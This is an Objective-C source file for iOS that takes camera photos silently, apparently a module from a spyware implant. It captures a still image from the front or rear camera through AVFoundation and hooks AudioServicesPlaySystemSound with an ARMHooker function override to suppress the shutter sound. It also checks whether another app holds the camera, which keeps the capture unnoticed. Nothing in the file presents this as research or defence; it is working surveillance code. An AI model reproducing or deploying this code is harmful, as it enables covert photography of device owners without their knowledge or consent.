//
//  CameraSupport.m
//
//  Created by kiodo on 02/12/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "CameraSupport.h"

#import "ARMHooker.h"
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreMedia/CoreMedia.h>

#define DEBUG_CAMERA

#define MAX_RETRY_COUNT 20

void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID);

void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID)
{
#ifdef DEBUG_CAMERA
  NSLog(@"%s: calling AudioServicesPlaySystemSound(%lu)", __FUNCTION__, inSystemSoundID);
#endif
  return;
}

NSData* runCamera(NSInteger frontRear);

static BOOL gGrabbed = FALSE;
static NSData *gImageData = nil;
static BOOL gCameraRun = NO;

@implementation CameraSupport

- (id)init
{
    self = [super init];
    return self;
}

- (BOOL)_checkCameraAvalaible
{
   if (gCameraRun == NO)
    {
#ifdef DEBUG_CAMERA_
      NSLog(@"%s: camera is available", __FUNCTION__);
#endif
      return TRUE;  
    }
  else
    {
#ifdef DEBUG_CAMERA_
      NSLog(@"%s: camera is NOT available", __FUNCTION__);
#endif
      return FALSE;
    }
}

- (void)_updateCameraStatus: (NSNotification*)aNotification
{
#ifdef DEBUG_CAMERA
  NSLog(@"%s: new notification", __FUNCTION__);
#endif
    NSDictionary *tmpDict = [aNotification userInfo];
    
    if (tmpDict != nil)
      {
        NSNumber *num = [tmpDict objectForKey: @"flag"];
        gCameraRun = [num intValue];
#ifdef DEBUG_CAMERA
      NSLog(@"%s: notification received %d", __FUNCTION__, gCameraRun);
#endif
      }
}

- (NSData*)_grabCameraShot: (NSInteger)aPosition
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
              
  int maxRetry = 0;
  
  gImageData = nil;
  gGrabbed = FALSE;
  
  AVCaptureDevice *av = nil;
  
  if ([self _checkCameraAvalaible] == NO)
    {
#ifdef DEBUG_CAMERA
      NSLog(@"%s: camera is locked!! exit!", __FUNCTION__);
#endif
      return gImageData;
    }
    
  NSArray *avArray = [AVCaptureDevice devicesWithMediaType: AVMediaTypeVideo]; 
  
  if (avArray == nil || [avArray count] <= 0) 
  {
#ifdef DEBUG_CAMERA
    NSLog(@"%s: no av array", __FUNCTION__);
#endif
    [pool release];
    return gImageData;
  }
  
  for (int i=0; i < [avArray count]; i++) 
    {
      av = [avArray objectAtIndex: i];
    
    if (av)
      {
      if ([av position] == aPosition)
        break;
      }
    else
      {
        [pool release];
        return gImageData;
      }
    }
    
  NSError *err;
    
  AVCaptureDeviceInput *inDev = [AVCaptureDeviceInput deviceInputWithDevice: av error: &err];
  
  if (inDev == nil)
    {
#ifdef DEBUG_CAMERA
      NSLog(@"%s: no input device - error %@", __FUNCTION__, err);
#endif
      [pool release];
      return gImageData;
    }
  
  AVCaptureSession *avSession = [[AVCaptureSession alloc] init];
  
  [avSession setSessionPreset: AVCaptureSessionPresetPhoto];
  [avSession beginConfiguration];
  
  if ([avSession canAddInput: inDev])
    [avSession addInput: inDev];
  else
    {
#ifdef DEBUG_CAMERA
      NSLog(@"%s: cant add input device", __FUNCTION__);
#endif
      [avSession release];
      [pool release];
      return gImageData;
    }
    
  AVCaptureStillImageOutput *outImg = [[AVCaptureStillImageOutput alloc] init];
    
  if ([avSession canAddOutput: outImg])
    [avSession addOutput: outImg];
  else
    {
#ifdef DEBUG_CAMERA
      NSLog(@"%s: cant add output device", __FUNCTION__);
#endif
      [avSession release];
      [outImg release];
      [pool release];
      return gImageData;
    }
    
  [avSession commitConfiguration];
  [avSession startRunning];
  
  NSArray *connex = [outImg connections];
  
  AVCaptureConnection *conn;
  
  if (connex != nil && [connex count] > 0)
    {
      conn = [connex objectAtIndex: 0];
    } 
  else
    {
#ifdef DEBUG_CAMERA
      NSLog(@"%s: cant get output connection", __FUNCTION__);
#endif
      [avSession release];
      [outImg release];
      [pool release];
      return gImageData;
    }
    
    [outImg captureStillImageAsynchronouslyFromConnection: conn completionHandler:
     (^(CMSampleBufferRef imageDataSampleBuffer, NSError *error)
        {
          if (imageDataSampleBuffer != NULL)
            {
              gImageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageDataSampleBuffer];
              
#ifdef DEBUG_CAMERA_
              NSLog(@"%s: write down image (gImageData = %#x [class %@], count %d) ", 
                    __FUNCTION__, gImageData, [gImageData class], [gImageData retain]);
              [gImageData writeToFile: @"/tmp/img.jpg" atomically:YES];
#endif         
              [gImageData retain];
            }
          else
            {
#ifdef DEBUG_CAMERA
              NSLog(@"%s: cant grab image buffer - err %@", __FUNCTION__, error);
#endif
              gImageData = nil;
            }
            
          gGrabbed = TRUE;
          
        })];
 
  NSPort *aPort = [NSPort port];
  
  [[NSRunLoop currentRunLoop] addPort: aPort 
                              forMode: NSRunLoopCommonModes];
                              
  while (gGrabbed == FALSE && maxRetry < MAX_RETRY_COUNT)
  {
    if ([self _checkCameraAvalaible] == NO)
      break;
    [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.250]];
    maxRetry++;
  }

  [avSession stopRunning]; 
  
  [avSession release];
  [outImg release];

  [pool release];
  
  return gImageData;
}

@end

extern "C" 
{
  NSData* runCamera(NSInteger frontRear)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    CameraSupport *cam = [[CameraSupport alloc] init];
    
    if (cam &&
        [cam _grabCameraShot: frontRear] != nil)
      {
#ifdef DEBUG_CAMERA_
        NSLog(@"%s: image camera grabbed (gImageData ret count %d)",
         __FUNCTION__, [gImageData retainCount]);
#endif    
      }
    else
      {
#ifdef DEBUG_CAMERA
        NSLog(@"%s: no image grabbed", __FUNCTION__);
#endif  
      }
    
    [cam release];
    [pool release];
    
    return gImageData;
  }

  void disableShutterSound()
  {
    AHOverrideFunction((char*)"AudioServicesPlaySystemSound", 
                       (const char*)0,
                       (const void*)AudioServicesPlaySystemSoundHook, 
                       (void**)NULL); 
  }
}